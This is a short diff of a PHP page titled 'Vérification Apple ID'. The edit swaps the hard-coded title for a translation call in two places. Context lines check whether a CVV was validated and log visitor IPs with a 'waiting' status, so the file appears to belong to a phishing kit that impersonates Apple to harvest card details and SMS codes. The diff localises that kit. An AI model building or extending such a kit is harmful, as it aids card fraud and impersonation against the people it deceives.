@@ -83,7 +83,7 @@ if (!$cvvValidated) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Vérification Apple ID</title>
+<title><?= t('html_title_sms') ?></title>
 <style>
   :root {
     --bg: #f2f2f7;
@@ -477,7 +477,7 @@ file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Vérification Apple ID</title>
+<title><?= t('html_title_sms') ?></title>
 <style>
   :root {
     --bg: #f2f2f7;
